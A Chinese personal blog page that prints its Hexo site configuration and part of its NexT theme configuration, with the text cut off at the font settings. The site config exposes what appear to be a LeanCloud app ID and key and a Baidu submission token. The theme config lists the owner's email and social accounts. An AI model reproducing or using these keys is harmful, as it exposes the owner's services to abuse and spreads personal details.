<h1 id="站点-config-配置信息"><a href="#站点-config-配置信息" class="headerlink" title="站点 config 配置信息"></a><strong><em>站点 config 配置信息</em></strong></h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line"># Hexo Configuration</span><br><span class="line">## Docs: https:&#x2F;&#x2F;hexo.io&#x2F;docs&#x2F;configuration.html</span><br><span class="line">## Source: https:&#x2F;&#x2F;github.com&#x2F;hexojs&#x2F;hexo&#x2F;</span><br><span class="line"></span><br><span class="line"># Site</span><br><span class="line">title: 孤桜懶契</span><br><span class="line">subtitle: Run</span><br><span class="line">description: 生活分享</span><br><span class="line">keywords: 孤桜懶契 </span><br><span class="line">author: 孤桜懶契</span><br><span class="line">language: zh-Hans  #语言</span><br><span class="line">timezone: &#39;&#39;</span><br><span class="line"></span><br><span class="line"># URL</span><br><span class="line">## If your site is put in a subdirectory, set url as &#39;http:&#x2F;&#x2F;yoursite.com&#x2F;child&#39; and root as &#39;&#x2F;child&#x2F;&#39;</span><br><span class="line">url: https:&#x2F;&#x2F;gylq.gitee.io&#x2F;</span><br><span class="line">root: &#x2F;</span><br><span class="line">permalink: :year&#x2F;:month&#x2F;:day&#x2F;:title&#x2F;</span><br><span class="line">permalink_defaults:</span><br><span class="line">pretty_urls:</span><br><span class="line">  trailing_index: true # Set to false to remove trailing &#39;index.html&#39; from permalinks</span><br><span class="line">  trailing_html: true # Set to false to remove trailing &#39;.html&#39; from permalinks</span><br><span class="line"></span><br><span class="line"># 文章链接唯一永久化</span><br><span class="line">#abbrlink:</span><br><span class="line">  #alg: crc32  #算法： crc16(default) and crc32</span><br><span class="line"> # rep: dec    #进制： dec(default) and hex</span><br><span class="line"></span><br><span class="line"># Directory</span><br><span class="line">source_dir: source</span><br><span class="line">public_dir: public</span><br><span class="line">tag_dir: tags</span><br><span class="line">archive_dir: archives</span><br><span class="line">category_dir: categories</span><br><span class="line">code_dir: downloads&#x2F;code</span><br><span class="line">i18n_dir: :lang</span><br><span class="line">skip_render: love&#x2F;**</span><br><span class="line"></span><br><span class="line"># Writing</span><br><span class="line">new_post_name: :title.md # File name of new posts</span><br><span class="line">default_layout: post</span><br><span class="line">titlecase: false # Transform title into titlecase</span><br><span class="line">external_link:</span><br><span class="line">  enable: true # Open external links in new tab</span><br><span class="line">  field: site # Apply to the whole site</span><br><span class="line">  exclude: &#39;&#39;</span><br><span class="line">filename_case: 0</span><br><span class="line">render_drafts: false</span><br><span class="line">post_asset_folder: false</span><br><span class="line">relative_link: false</span><br><span class="line">future: true</span><br><span class="line">highlight:</span><br><span class="line">  enable: true</span><br><span class="line">  line_number: true</span><br><span class="line">  auto_detect: false</span><br><span class="line">  tab_replace: &#39;&#39;</span><br><span class="line">  wrap: true</span><br><span class="line">  hljs: false</span><br><span class="line"></span><br><span class="line"># Home page setting</span><br><span class="line"># path: Root path for your blogs index page. (default &#x3D; &#39;&#39;)</span><br><span class="line"># per_page: Posts displayed per page. (0 &#x3D; disable pagination)</span><br><span class="line"># order_by: Posts order. (Order by date descending by default)</span><br><span class="line">index_generator:</span><br><span class="line">  path: &#39;&#39;</span><br><span class="line">  per_page: 10</span><br><span class="line">  order_by: -date</span><br><span class="line"></span><br><span class="line"># Category &amp; Tag</span><br><span class="line">default_category: uncategorized</span><br><span class="line">category_map:</span><br><span class="line">tag_map:</span><br><span class="line"></span><br><span class="line"># Metadata elements</span><br><span class="line">## https:&#x2F;&#x2F;developer.mozilla.org&#x2F;en-US&#x2F;docs&#x2F;Web&#x2F;HTML&#x2F;Element&#x2F;meta</span><br><span class="line">meta_generator: true</span><br><span class="line"></span><br><span class="line"># Date &#x2F; Time format</span><br><span class="line">## Hexo uses Moment.js to parse and display date</span><br><span class="line">## You can customize the date format as defined in</span><br><span class="line">## http:&#x2F;&#x2F;momentjs.com&#x2F;docs&#x2F;#&#x2F;displaying&#x2F;format&#x2F;</span><br><span class="line">date_format: YYYY-MM-DD</span><br><span class="line">time_format: HH:mm:ss</span><br><span class="line">## Use post&#39;s date for updated date unless set in front-matter</span><br><span class="line">use_date_for_updated: false</span><br><span class="line"></span><br><span class="line"># Pagination</span><br><span class="line">## Set per_page to 0 to disable pagination</span><br><span class="line">per_page: 10</span><br><span class="line">pagination_dir: page</span><br><span class="line"></span><br><span class="line"># Include &#x2F; Exclude file(s)</span><br><span class="line">## include:&#x2F;exclude: options only apply to the &#39;source&#x2F;&#39; folder</span><br><span class="line">include:</span><br><span class="line">exclude:</span><br><span class="line">ignore:</span><br><span class="line"></span><br><span class="line"># Extensions</span><br><span class="line">## Plugins: https:&#x2F;&#x2F;hexo.io&#x2F;plugins&#x2F;</span><br><span class="line">## Themes: https:&#x2F;&#x2F;hexo.io&#x2F;themes&#x2F;</span><br><span class="line">theme: nextup</span><br><span class="line"></span><br><span class="line"># Deployment</span><br><span class="line">## Docs: https:&#x2F;&#x2F;hexo.io&#x2F;docs&#x2F;deployment.html</span><br><span class="line">deploy:</span><br><span class="line">    type: git</span><br><span class="line">    repository: </span><br><span class="line">       - https:&#x2F;&#x2F;gitee.com&#x2F;gylq&#x2F;GYLQ</span><br><span class="line">       - https:&#x2F;&#x2F;github.com&#x2F;GYLQ&#x2F;GYLQ.github.io</span><br><span class="line">    branch: master</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># backup</span><br><span class="line">backup:</span><br><span class="line">  type: git</span><br><span class="line">  theme: nextup</span><br><span class="line">  repository:</span><br><span class="line">    - https:&#x2F;&#x2F;gitee.com&#x2F;gylq&#x2F;backup.git,backup</span><br><span class="line"></span><br><span class="line"># Search</span><br><span class="line">search:</span><br><span class="line">  path: search.xml</span><br><span class="line">  field: post</span><br><span class="line">  format: html</span><br><span class="line">  limit: 10000</span><br><span class="line"></span><br><span class="line">leancloud_counter_security:</span><br><span class="line">  enable_sync: true</span><br><span class="line">  app_id: HzU5gDhBUYHF8QTF8DmbGhjD-gzGzoHsz</span><br><span class="line">  app_key: wp1HNJ17SdpnE0wIFq99eTKH</span><br><span class="line">  username: # Will be asked while deploying if is left blank</span><br><span class="line">  password: # Recommmended to be left blank. Will be asked while deploying if is left blank</span><br><span class="line"></span><br><span class="line"># Extensions</span><br><span class="line">## Plugins: http:&#x2F;&#x2F;hexo.io&#x2F;plugins&#x2F;</span><br><span class="line">#RSS订阅</span><br><span class="line">plugin:</span><br><span class="line">- hexo-generator-feed</span><br><span class="line">#Feed Atom</span><br><span class="line">feed:</span><br><span class="line">type: atom</span><br><span class="line">path: atom.xml</span><br><span class="line">limit: 20</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># https:&#x2F;&#x2F;blog.csdn.net&#x2F;lewky_liu&#x2F;article&#x2F;details&#x2F;82432003</span><br><span class="line"># https:&#x2F;&#x2F;github.com&#x2F;rozbo&#x2F;hexo-neat</span><br><span class="line">neat_enable: true</span><br><span class="line"># 压缩html</span><br><span class="line">neat_html:</span><br><span class="line">  enable: true</span><br><span class="line">  exclude:</span><br><span class="line"># 压缩css</span><br><span class="line">neat_css:</span><br><span class="line">  enable: true</span><br><span class="line">  exclude:</span><br><span class="line">  - &#39;**&#x2F;*.min.css&#39;</span><br><span class="line">  - &#39;**&#x2F;needsharebutton.css&#39;</span><br><span class="line"># 压缩js</span><br><span class="line">neat_js:</span><br><span class="line">  enable: true</span><br><span class="line">  mangle: true</span><br><span class="line">  output:</span><br><span class="line">  compress:</span><br><span class="line">  exclude:</span><br><span class="line">  - &#39;**&#x2F;*.min.js&#39;</span><br><span class="line">  - &#39;**&#x2F;jquery.fancybox.pack.js&#39;</span><br><span class="line">  - &#39;**&#x2F;index.js&#39;</span><br><span class="line">  - &#39;**&#x2F;waifu-tips.js&#39;</span><br><span class="line">  - &#39;**&#x2F;iframe.js&#39;</span><br><span class="line">  - &#39;**&#x2F;fireworks.js&#39;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Security</span><br><span class="line">##</span><br><span class="line">encrypt:</span><br><span class="line">    enable: true</span><br><span class="line"></span><br><span class="line">baidu_url_submit:</span><br><span class="line">  count: 1               # 提交最新的多少个链接</span><br><span class="line">  host: gylq.gitee.io    # 在百度站长平台中添加的域名</span><br><span class="line">  token: J4AuJNJ3lc4J8GAQ      # 秘钥</span><br><span class="line">  path: baidu_urls.txt   # 文本文档的地址， 新链接会保存在此文本文档里</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h1 id="主题config配置信息"><a href="#主题config配置信息" class="headerlink" title="主题config配置信息"></a>主题config配置信息</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line"># &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"># &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; ATTENTION! &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"># &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"># NexT repository is moving here: https:&#x2F;&#x2F;github.com&#x2F;theme-next</span><br><span class="line"># &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"># It&#39;s rebase to v6.0.0 and future maintenance will resume there</span><br><span class="line"># &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line"># ---------------------------------------------------------------</span><br><span class="line"># Theme Core Configuration Settings</span><br><span class="line"># ---------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"># Set to true, if you want to fully override the default configuration.</span><br><span class="line"># Useful if you don&#39;t want to inherit the theme _config.yml configurations.</span><br><span class="line">override: false</span><br><span class="line"></span><br><span class="line"># ---------------------------------------------------------------</span><br><span class="line"># Site Information Settings</span><br><span class="line"># ---------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"># To get or check favicons visit: https:&#x2F;&#x2F;realfavicongenerator.net</span><br><span class="line"># Put your favicons into &#96;hexo-site&#x2F;source&#x2F;&#96; (recommend) or &#96;hexo-site&#x2F;themes&#x2F;next&#x2F;source&#x2F;images&#x2F;&#96; directory.</span><br><span class="line"></span><br><span class="line"># Default NexT favicons placed in &#96;hexo-site&#x2F;themes&#x2F;next&#x2F;source&#x2F;images&#x2F;&#96; directory.</span><br><span class="line"># And if you want to place your icons in &#96;hexo-site&#x2F;source&#x2F;&#96; root directory, you must remove &#96;&#x2F;images&#96; prefix from pathes.</span><br><span class="line"></span><br><span class="line"># For example, you put your favicons into &#96;hexo-site&#x2F;source&#x2F;images&#96; directory.</span><br><span class="line"># Then need to rename &amp; redefine they on any other names, otherwise icons from Next will rewrite your custom icons in Hexo.</span><br><span class="line">favicon:</span><br><span class="line">  small: &#x2F;images&#x2F;favicon-16x16-next .png</span><br><span class="line">  medium: &#x2F;images&#x2F;favicon-32x32-next.png</span><br><span class="line">  apple_touch_icon: &#x2F;images&#x2F;apple-touch-icon-next.png</span><br><span class="line">  safari_pinned_tab: &#x2F;images&#x2F;logo.svg</span><br><span class="line">  #android_manifest: &#x2F;images&#x2F;manifest.json</span><br><span class="line">  #ms_browserconfig: &#x2F;images&#x2F;browserconfig.xml</span><br><span class="line"></span><br><span class="line"># Set default keywords (Use a comma to separate)</span><br><span class="line">keywords: &quot;Hexo个人博客,NexT美化优化,哈林摇,Mac Panel特效,Leaf,北宸,Java程序员,北京,旅行,摄像,Github Pages,搭建教程,demo,博客相册,文章排行榜,网站SEO&quot;</span><br><span class="line"></span><br><span class="line"># Set rss to false to disable feed link.</span><br><span class="line"># Leave rss as empty to use site&#39;s feed link.</span><br><span class="line"># Set rss to specific value if you have burned your feed already.</span><br><span class="line">rss: &#x2F;atom.xml</span><br><span class="line"></span><br><span class="line">footer:</span><br><span class="line">  # Specify the date when the site was setup.</span><br><span class="line">  # If not defined, current year will be used.</span><br><span class="line">  since: 2020 #建站时间</span><br><span class="line"></span><br><span class="line">  # Icon between year and copyright info.</span><br><span class="line">#  icon: user</span><br><span class="line">#  icon: heart #底部心形图案</span><br><span class="line">  icon: heartbeat #底部心形图案</span><br><span class="line"></span><br><span class="line">  # If not defined, will be used &#96;author&#96; from Hexo main config.</span><br><span class="line">  copyright:</span><br><span class="line">  # -------------------------------------------------------------</span><br><span class="line">  # Hexo link (Powered by Hexo).</span><br><span class="line">  powered: false</span><br><span class="line"></span><br><span class="line">  theme:</span><br><span class="line">    # Theme &amp; scheme info link (Theme - NexT.scheme).</span><br><span class="line">    enable: false</span><br><span class="line">    # Version info of NexT after scheme info (vX.X.X).</span><br><span class="line">    version: false</span><br><span class="line"></span><br><span class="line">  # 网站底部运行时间</span><br><span class="line">  runtime:</span><br><span class="line">    enable: true</span><br><span class="line">    birthday: &quot;07&#x2F;02&#x2F;2020 10:00:00&quot;</span><br><span class="line">    color: &quot;#1890ff&quot;</span><br><span class="line">  # 网站底部uv pv</span><br><span class="line">  diy_visit:</span><br><span class="line">    enable: true</span><br><span class="line"></span><br><span class="line">  # -------------------------------------------------------------</span><br><span class="line">  # Any custom text can be defined here.</span><br><span class="line">  #custom_text: Hosted by &lt;a target&#x3D;&quot;_blank&quot; href&#x3D;&quot;https:&#x2F;&#x2F;pages.github.com&quot;&gt;GitHub Pages&lt;&#x2F;a&gt;</span><br><span class="line"></span><br><span class="line"># ---------------------------------------------------------------</span><br><span class="line"># SEO Settings</span><br><span class="line"># ---------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"># Canonical, set a canonical link tag in your hexo, you could use it for your SEO of blog.</span><br><span class="line"># See: https:&#x2F;&#x2F;support.google.com&#x2F;webmasters&#x2F;answer&#x2F;139066</span><br><span class="line"># Tips: Before you open this tag, remember set up your URL in hexo _config.yml ( ex. url: http:&#x2F;&#x2F;yourdomain.com )</span><br><span class="line">canonical: true</span><br><span class="line"></span><br><span class="line"># Change headers hierarchy on site-subtitle (will be main site description) and on all post&#x2F;pages titles for better SEO-optimization.</span><br><span class="line">seo: true # description的描述会不显示</span><br><span class="line"></span><br><span class="line"># If true, will add site-subtitle to index page, added in main hexo config.</span><br><span class="line"># subtitle: Subtitle</span><br><span class="line">index_with_subtitle: true</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># ---------------------------------------------------------------</span><br><span class="line"># Menu Settings</span><br><span class="line"># ---------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"># When running the site in a subdirectory (e.g. domain.tld&#x2F;blog), remove the leading slash from link value (&#x2F;archives -&gt; archives).</span><br><span class="line"># Usage: &#96;Key: &#x2F;link&#x2F; || icon&#96;</span><br><span class="line"># Key is the name of menu item. If translate for this menu will find in languages - this translate will be loaded; if not - Key name will be used. Key is case-senstive.</span><br><span class="line"># Value before &#96;||&#96; delimeter is the target link.</span><br><span class="line"># Value after &#96;||&#96; delimeter is the name of FontAwesome icon. If icon (with or without delimeter) is not specified, question icon will be loaded.</span><br><span class="line">menu:</span><br><span class="line">  home: &#x2F;|| home</span><br><span class="line"> # top: top || signal</span><br><span class="line">  archives: &#x2F;archives&#x2F;||archive</span><br><span class="line">  categories: &#x2F;categories&#x2F; || th</span><br><span class="line">  tags: &#x2F;tags&#x2F; || tags</span><br><span class="line">  life: &#x2F;life&#x2F; || apple</span><br><span class="line"> # movies: &#x2F;movies&#x2F; || film</span><br><span class="line">#  xiaohutong: &#x2F;xiaohutong || map</span><br><span class="line">#  sitemap: &#x2F;sitemap.xml || sitemap</span><br><span class="line">  #schedule: &#x2F;schedule&#x2F; || calendar</span><br><span class="line">  #commonweal: &#x2F;404&#x2F; || heartbeat</span><br><span class="line">#  links: &#x2F;links&#x2F; || link</span><br><span class="line">  about: &#x2F;about&#x2F; || user</span><br><span class="line"></span><br><span class="line"># Enable&#x2F;Disable menu icons.</span><br><span class="line">menu_icons:</span><br><span class="line">  enable: true</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># ---------------------------------------------------------------</span><br><span class="line"># Scheme Settings</span><br><span class="line"># ---------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"># Schemes</span><br><span class="line">#scheme: Muse</span><br><span class="line">#scheme: Mist</span><br><span class="line">scheme: Pisces</span><br><span class="line">#scheme: Gemini</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># ---------------------------------------------------------------</span><br><span class="line"># Sidebar Settings</span><br><span class="line"># ---------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"># Social Links.</span><br><span class="line"># Usage: &#96;Key: permalink || icon&#96;</span><br><span class="line"># Key is the link label showing to end users.</span><br><span class="line"># Value before &#96;||&#96; delimeter is the target permalink.</span><br><span class="line"># Value after &#96;||&#96; delimeter is the name of FontAwesome icon. If icon (with or without delimeter) is not specified, globe icon will be loaded.</span><br><span class="line">#social:</span><br><span class="line">  #GitHub: https:&#x2F;&#x2F;github.com&#x2F;yourname || github</span><br><span class="line">  #E-Mail: mailto:yourname@gmail.com || envelope</span><br><span class="line">  #Google: https:&#x2F;&#x2F;plus.google.com&#x2F;yourname || google</span><br><span class="line">  #Twitter: https:&#x2F;&#x2F;twitter.com&#x2F;yourname || twitter</span><br><span class="line">  #FB Page: https:&#x2F;&#x2F;www.facebook.com&#x2F;yourname || facebook</span><br><span class="line">  #VK Group: https:&#x2F;&#x2F;vk.com&#x2F;yourname || vk</span><br><span class="line">  #StackOverflow: https:&#x2F;&#x2F;stackoverflow.com&#x2F;yourname || stack-overflow</span><br><span class="line">  #YouTube: https:&#x2F;&#x2F;youtube.com&#x2F;yourname || youtube</span><br><span class="line">  #Instagram: https:&#x2F;&#x2F;instagram.com&#x2F;yourname || instagram</span><br><span class="line">  #Skype: skype:yourname?call|chat || skype</span><br><span class="line"></span><br><span class="line">social:</span><br><span class="line">  GitHub: https:&#x2F;&#x2F;github.com&#x2F;GYLQ&#x2F;GYLQ.github.io || github</span><br><span class="line">  E-Mail: mailto:2324298829@qq.com || envelope</span><br><span class="line">  微博: https:&#x2F;&#x2F;weibo.com&#x2F;u&#x2F;5828235984?refer_flag&#x3D;1005055010_ || weibo</span><br><span class="line">  喜马拉雅: https:&#x2F;&#x2F;www.ximalaya.com&#x2F;zhubo&#x2F;146380077 || twitter</span><br><span class="line">  哔哩哔哩: https:&#x2F;&#x2F;space.bilibili.com&#x2F;13563835 || apple</span><br><span class="line">  #Facebook: https:&#x2F;&#x2F;www.facebook.com&#x2F;jame.leaf.94 || facebook</span><br><span class="line">  #Witter: https:&#x2F;&#x2F;twitter.com&#x2F;Leafjame || twitter</span><br><span class="line">  #YouTube: https:&#x2F;&#x2F;youtube.com&#x2F;channel&#x2F;UCtzIJK9eLCWLQF13KpZE-0w  || youtube</span><br><span class="line">  #Jianshu: https:&#x2F;&#x2F;www.jianshu.com&#x2F;u&#x2F;3b74c7b81348 || instagram</span><br><span class="line"></span><br><span class="line">social_icons:</span><br><span class="line">  enable: true</span><br><span class="line">  icons_only: true</span><br><span class="line">  transition: false</span><br><span class="line"></span><br><span class="line"># Blog rolls</span><br><span class="line">links_icon: link</span><br><span class="line">links_title: 友情链接</span><br><span class="line">links_layout: block</span><br><span class="line">#links_layout: inline</span><br><span class="line">links:</span><br><span class="line">  #daovoice: http:&#x2F;&#x2F;www.daovoice.io&#x2F;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Sidebar Avatar</span><br><span class="line"># in theme directory(source&#x2F;images): &#x2F;images&#x2F;avatar.gif</span><br><span class="line"># in site  directory(source&#x2F;uploads): &#x2F;uploads&#x2F;avatar.gif</span><br><span class="line">#avatar: &#x2F;images&#x2F;avatar.gif</span><br><span class="line"></span><br><span class="line">avatar: &#x2F;images&#x2F;qq.png</span><br><span class="line"></span><br><span class="line"># Table Of Contents in the Sidebar</span><br><span class="line">toc:</span><br><span class="line">  enable: true</span><br><span class="line"></span><br><span class="line">  # Automatically add list number to toc.</span><br><span class="line">  number: true</span><br><span class="line"></span><br><span class="line">  # If true, all words will placed on next lines if header width longer then sidebar width.</span><br><span class="line">  wrap: false</span><br><span class="line"></span><br><span class="line"># Creative Commons 4.0 International License.</span><br><span class="line"># http:&#x2F;&#x2F;creativecommons.org&#x2F;</span><br><span class="line"># Available: by | by-nc | by-nc-nd | by-nc-sa | by-nd | by-sa | zero</span><br><span class="line">#creative_commons: by-nc-sa</span><br><span class="line">#creative_commons:</span><br><span class="line"></span><br><span class="line">sidebar:</span><br><span class="line">  # Sidebar Position, available value: left | right (only for Pisces | Gemini).</span><br><span class="line">  position: left</span><br><span class="line">  #position: right</span><br><span class="line"></span><br><span class="line">  # Sidebar Display, available value (only for Muse | Mist):</span><br><span class="line">  #  - post    expand on posts automatically. Default.</span><br><span class="line">  #  - always  expand for all pages automatically</span><br><span class="line">  #  - hide    expand only when click on the sidebar toggle icon.</span><br><span class="line">  #  - remove  Totally remove sidebar including sidebar toggle.</span><br><span class="line">  display: post</span><br><span class="line">  #display: always</span><br><span class="line">  #display: hide</span><br><span class="line">  #display: remove</span><br><span class="line"></span><br><span class="line">  # Sidebar offset from top menubar in pixels (only for Pisces | Gemini).</span><br><span class="line">  offset: 12</span><br><span class="line"></span><br><span class="line">  # Back to top in sidebar (only for Pisces | Gemini).</span><br><span class="line">  b2t: false</span><br><span class="line"></span><br><span class="line">  # Scroll percent label in b2t button.</span><br><span class="line">  scrollpercent: true</span><br><span class="line"></span><br><span class="line">  # Enable sidebar on narrow view (only for Muse | Mist). such as #scheme: Muse  #scheme: Mist</span><br><span class="line">  onmobile: true</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># ---------------------------------------------------------------</span><br><span class="line"># Post Settings</span><br><span class="line"># ---------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"># Automatically scroll page to section which is under &lt;!-- more --&gt; mark.</span><br><span class="line">scroll_to_more: false</span><br><span class="line"></span><br><span class="line"># Automatically saving scroll position on each post&#x2F;page in cookies.</span><br><span class="line">save_scroll: false</span><br><span class="line"></span><br><span class="line"># Automatically excerpt description in homepage as preamble text.</span><br><span class="line">excerpt_description: true</span><br><span class="line"></span><br><span class="line"># Automatically Excerpt. Not recommend.</span><br><span class="line"># Please use &lt;!-- more --&gt; in the post to control excerpt accurately.</span><br><span class="line">auto_excerpt:</span><br><span class="line">  enable: true</span><br><span class="line">  length: 150</span><br><span class="line"></span><br><span class="line"># Post meta display settings</span><br><span class="line">post_meta:</span><br><span class="line">  item_text: false #隐藏文章标题下方&#39;发表于&#39;..文字</span><br><span class="line">  created_at: true</span><br><span class="line">  updated_at: false</span><br><span class="line">  categories: true</span><br><span class="line"></span><br><span class="line"># Post wordcount display settings</span><br><span class="line"># Dependencies: https:&#x2F;&#x2F;github.com&#x2F;willin&#x2F;hexo-wordcount</span><br><span class="line">post_wordcount:</span><br><span class="line">  item_text: false</span><br><span class="line">  wordcount: true</span><br><span class="line">  min2read: false</span><br><span class="line">  totalcount: true</span><br><span class="line">  separated_meta: false</span><br><span class="line"></span><br><span class="line"># Wechat Subscriber</span><br><span class="line">#wechat_subscriber:</span><br><span class="line">  #enabled: true</span><br><span class="line">  #qcode: &#x2F;path&#x2F;to&#x2F;your&#x2F;wechatqcode ex. &#x2F;uploads&#x2F;wechat-qcode.jpg</span><br><span class="line">  #description: ex. subscribe to my blog by scanning my public wechat account</span><br><span class="line"></span><br><span class="line"># Reward</span><br><span class="line">#reward_comment: Donate comment here</span><br><span class="line">wechatpay: &#x2F;images&#x2F;wechatpay.jpg</span><br><span class="line">alipay: &#x2F;images&#x2F;alipay.jpg</span><br><span class="line">#bitcoin: &#x2F;images&#x2F;bitcoin.png</span><br><span class="line"></span><br><span class="line">reward_comment: 坚持原创技术分享，感谢您的支持和鼓励！</span><br><span class="line">#wechatpay: &#x2F;images&#x2F;wechatpay.jpg</span><br><span class="line">#alipay: &#x2F;images&#x2F;alipay.jpg</span><br><span class="line"></span><br><span class="line"># Declare license on posts</span><br><span class="line">post_copyright:</span><br><span class="line">  enable: false</span><br><span class="line">  license: CC BY-NC-SA 3.0</span><br><span class="line">  license_url: https:&#x2F;&#x2F;creativecommons.org&#x2F;licenses&#x2F;by-nc-sa&#x2F;3.0&#x2F;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># ---------------------------------------------------------------</span><br><span class="line"># Misc Theme Settings</span><br><span class="line"># ---------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"># Reduce padding &#x2F; margin indents on devices with narrow width.</span><br><span class="line">mobile_layout_economy: false #开启会影起文章边框消失</span><br><span class="line"></span><br><span class="line"># Android Chrome header panel color ($black-deep).</span><br><span class="line">android_chrome_color: &quot;#222&quot;</span><br><span class="line"></span><br><span class="line"># Custom Logo.</span><br><span class="line"># !!Only available for Default Scheme currently.</span><br><span class="line"># Options:</span><br><span class="line">#   enabled: [true&#x2F;false] - Replace with specific image</span><br><span class="line">#   image: url-of-image   - Images&#39;s url</span><br><span class="line">custom_logo:</span><br><span class="line">  enabled: false</span><br><span class="line">  image:</span><br><span class="line"></span><br><span class="line"># Code Highlight theme</span><br><span class="line"># Available value:</span><br><span class="line">#    normal | night | night eighties | night blue | night bright</span><br><span class="line"># https:&#x2F;&#x2F;github.com&#x2F;chriskempson&#x2F;tomorrow-theme</span><br><span class="line">highlight_theme: normal</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># ---------------------------------------------------------------</span><br><span class="line"># Font Settings</span><br><span class="line"># - Find fonts on Google Fonts (https:&#x2F;&#x2F;www.google.com&#x2F;fonts)</span><br><span class="line"># - All fonts set here will have the following styles:</span><br><span class="line">#     light, light italic, normal, normal italic, bold, bold italic</span><br><span class="line"># - Be aware that setting too much fonts will cause site running slowly</span><br><span class="line"># - Introduce in 5.0.1</span><br><span class="line"># ---------------------------------------------------------------</span><br><span class="line"># CAUTION! Safari Version 10.1.2 bug: https:&#x2F;&#x2F;github.com&#x2F;iissnan&#x2F;hexo-theme-next&#x2F;issues&#x2F;1844</span><br><span class="line"># To avoid space between header and sidebar in Pisces &#x2F; Gemini themes recommended to use Web Safe fonts for &#96;global&#96; (and &#96;logo&#96;):</span><br><span class="line"># Arial | Tahoma | Helvetica | Times New Roman | Courier New | Verdana | Georgia | Palatino | Garamond | Comic Sans MS | Trebuchet MS</span><br><span class="line"># ---------------------------------------------------------------</span><br><span class="line">font:</span><br><span class="line">  enable: true</span><br><span class="line"></span><br><span class="line">  # Uri of fonts host. E.g. &#x2F;&#x2F;fonts.googleapis.com (Default).</span><br><span 